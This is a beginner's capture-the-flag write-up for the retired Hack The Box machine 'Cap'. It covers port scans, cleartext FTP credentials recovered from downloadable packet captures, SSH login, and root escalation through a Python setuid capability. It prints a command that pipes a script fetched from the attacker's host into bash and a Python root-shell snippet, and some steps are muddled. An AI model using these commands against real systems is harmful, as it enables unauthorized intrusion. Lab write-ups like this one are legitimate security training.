# HTB - Cap

## General Information

- **Platform:** Hack The Box
- **Difficulty:** Easy 
- **Operating System:** Linux 
- **Status:** Retired

## 1. Reconnaissance

### Port Scanning 

First, I scanned the network looking for open ports 
nmap 10.129.178.103

PORT   STATE SERVICE

21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Then I tried to see the services:

nmap -p 21,22,80 -sV 10.129.178.103


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

### Enumeration

## 2. Initial Access

### FTP (21) 

ftp 10.129.178.103 using anonymous as the user 
However I could get in by ftp it appeared this:

Name (10.129.178.103:vartriz): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed.
ftp> 

It seems that the login by Anonymous is locked and the FTP is active

### SSH (22)
nmap -p 22 --script ssh2-enum-algos 10.129.178.103

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (9)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com


As you can see we have info about the SSH;
ssh2-enum-alogos didnt find any vulnerability, all algorithms are secure such as passwords ( rsa-sha2 ).
In conclusion, guess I cant access by SSH

### HTTP (80)

I needed to see what's going on this page. It looks like a Security dashboard.

curl -I http://10.129.178.103

HTTP/1.1 200 OK
Server: gunicorn
Date: Thu, 22 Oct 2026 00:37:32 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 19386

Gunicorn is a server WSGI ( Python ) Does it mean there must be something in the backend using python.
Maybe something like Flask.

It really didnt work so im gonna see the website

Inside the page there are a lot of interesting things. For instance, im using a profile called
Nathan and I can see the Security Snapshot , IP Config and network status.

In Home I couldnt do anything ( I cant even click on something to interact with )
http://10.129.178.103/#

In the Dashboard there is something even more interesting; There is a Download buttom.
( Maybe I can capture some of trafic here ) 

I clicked on Download and it's an a file .pcap but i didnt see anything in this file.


In the Ip confing : Eth0 and lo. I think this page reveals the output for netstat, the system must be executing system commdas.

http://10.129.178.103/ip

At the end, the Network status there are a lot of logs showing addresses, users and more things.
http://10.129.178.103/netstat

I tried to see the files uploaded on the system looking for js, html, secret files.
Out of nowhere, when  I reloaded the page when I noticed the IDs changed, they were in 0
but they they have different numbers, they I clicked on Download again I see traffic in that file.

I saw what happened, the data/0 changed, then I tried with data/0 , data/1, data/2, data/3, data/4, data/5 but in the last one it didnt work
The first file that I opened it was data 0 and i saw how wireshark was detecting the FTP traffic uncrypted
YOU KNOW WHAT MEANS THAT?
Yea, we can access by ftp because we have the user ( nathan ) and the password (Request arg: Buck3tH4TF0RM3!)	
I tried that and I joined 

Name (10.129.178.103:vartriz): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Oct 22 00:10 user.txt
226 Directory send OK.
ftp> get user.txt

Then I read the flag : 3587756c0076d6d8bb95496ff34e1893

But it wasnt the greatest thing today, it was that it works with SSH too.

nathan@10.129.178.103's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct 22 01:17:26 UTC 2026

  System load:           0.08
  Usage of /:            36.7% of 8.73GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.178.103
  IPv6 address for eth0: dead:beef::a0de:adff:fe25:f406

  => There are 3 zombie processes.

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 

The last task is : Being root

I didnt know how to do that ... the offical document shows this tool called linPEAS.
let's use it.


nathan@cap:~$ curl http://10.129.178.103/linpeas.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   232  100   232    0     0  77333      0 --:--:-- --:--:-- --:--:--  113k
bash: line 1: syntax error near unexpected token `newline'
bash: line 1: `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">'
nathan@cap:~$ 

I realized it didnt work then i had to see the reason.

Creating a server using python3 -m http.server 80 to listening to the server.
I gotta connect my server to the web' server 

curl http://10.10.14.208/linpeas.sh | bash showing what's wrong with the victim' system.
It appeared a vulnerability related with python then we gotta take avarage of that.

_=/usr/bin/bash
_=/usr/bin/cat
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/sed
_=/usr/bin/sort
_=/usr/bin/tr
_=/usr/bin/xxd

and finally, using /usr/bin/grep
we can do this according to the Walkthrough of Cap
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# 
root@cap:~# cat user.txt 
3587756c0076d6d8bb95496ff34e1893


##4. Evidence
### Images:

### Versions:

FTP vsftpd 3.0.3
SSH Open SSH 8.2p1 
HTTP Gunicorn 
 
## 5. Lessons Learned

- What concepts did I learn?
At first, I learn how to access by FTP using the anonymous trick.
At second, How to root when you can login via SSH
## References


